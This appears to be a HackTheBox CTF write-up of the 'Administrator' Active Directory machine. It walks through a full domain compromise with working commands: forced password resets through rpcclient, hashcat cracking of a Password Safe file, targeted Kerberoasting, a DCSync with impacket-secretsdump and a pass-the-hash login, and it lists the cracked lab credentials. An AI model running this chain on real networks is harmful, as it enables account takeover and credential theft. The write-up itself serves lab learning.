---
date: 2025-04-03
categories: [CTF, HTB]
title: "HTB - Administrator - AD Breach"
tags: ['bloodhound', 'ftp', 'hashcat', 'impacket', 'nmap', 'privilege escalation', 'python', 'rce', 'secretsdump', 'smb', 'windows', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']


description: "Administrator - AD Breach - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Administrator - AD Breach

We are given the following account to start with:
Username: **Olivia**
Password: **ichliebedich**

NMAP

![image1](../resources/50e46876cd2243c5875f4d000d2a5a48.png)

- Check creds:

```bash
crackmapexec smb 10.10.11.42 -u "olivia" -p "ichliebedich"

```

![image2](../resources/07a7fbc74a9a4430b6acaec81089d3f5.png)

- WinRM in:

```bash
evil-winrm -i 10.10.11.42 -u "olivia" -p "ichliebedich"

```

![image3](../resources/a330f4d2344c4dd2bd8b5737b26aa317.png)

- Run BloodHound:

```bash
bloodhound-python -c all -d administrator.htb -dc dc.administrator.htb -u olivia -p "ichliebedich" -ns 10.10.11.42

```

![image4](../resources/5df522cb9cd34b5da1316b10b77b064f.png)


![image5](../resources/954e4fc6fde94791ae772fb6549e1e9b.png)


![image6](../resources/eeb16fc489d347299848ff00c4ca39e7.png)


![image7](../resources/1994c18fafa741a2b1bdc8b5ebcb1142.png)

- Change passwords for users:

```bash
rpcclient -U 'administrator.htb/olivia%ichliebedich' 10.10.11.42

setuserinfo2 michael 23 'Password1'

rpcclient -U 'administrator.htb/michael%Password1' 10.10.11.42

setuserinfo2 benjamin 23 'Password1'

```

- We can remote in with Michael:

![image8](../resources/1c7be244480341b89c095e84a2595fe7.png)

And he has PowerView in his Documents folder

- Moving on - We changed Benjamin's password as well

- He can't remote in
- Shares doesn't show anything special

- But he can log in to the ftp server:

```bash
ftp 10.10.11.42
```

![image9](../resources/f6d47ff05f304409a87a88cfd036ebf7.png)

- We get a psafe3 file:
Password Safe V3 database


![image10](../resources/09335f53afec4e53b04fc16c7c05893d.png)

- Searching online, we see hashcat can crack it without extracting the hash first:

![image11](../resources/1dca03b18a0943eb85b6320b3c30e589.png)

```bash
hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt

```

![image12](../resources/d46253ec2a934d048f1846eaa8e059f7.png)

**Backup.psafe3 : tekieromucho**

- Download and open file in PasswordSafe:

![image13](../resources/c2694de1375d4f34a49ef15c7f993483.png)


![image14](../resources/9ae4d9e735e54f0d9011796a26fa8333.png)

alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw

emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb

emma : WwANQWnmJnGV07WQN8bMS7FMAbjNur

- We have Emily's password --\> which has **GenericWrite** over Ethan --\> Which can DCSync

**<u>From Windows</u>**
- Upload PowerView.ps1 and run:

```bash
. .\Powerview.ps1

Set-DomainObject -Identity ethan -Set @{serviceprincipalname="SPN/ethan}

```

![image15](../resources/fb6763e2b8584240a8e3cf5bc12ff489.png)

Remove the SPN After Obtaining the Hash:

```bash
Set-DomainObject -Identity target_user_samaccountname -Remove @{serviceprincipalname="SPN/targetuser"}
sudo ntpdate -u 10.10.11.42
impacket-GetUserSPNs administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -dc-ip 10.10.11.42 -request
```

![image16](../resources/5cf2fd9fc0434402a1958344e7cfa61d.png)

**<u>Or from KALI:</u>**
[TargetedKerberoast:](https://github.com/ShutdownRepo/targetedKerberoast?tab=readme-ov-file)

```bash
python3 targetedKerberoast.py -d administrator.htb -u emily -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" --dc-ip 10.10.11.42

```

![image17](../resources/ad38bf2545734ff7a752129f45ce9067.png)

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

```

![image18](../resources/c12e2f812bec4aa8b0b6ca0855ed03d5.png)

**ethan : limpbizkit**

- Ethan has DCSync rights:

```bash
impacket-secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42

```

![image19](../resources/d8f1510a09554b059fa8c03c14745b2d.png)

```bash
evil-winrm -i 10.10.11.42 -u "administrator" -H "3dc553ce4b9fd20bd016e098d2d2fd2e"

```

![image20](../resources/1e9bb9cf9b1441a284f28afe15c0c11e.png)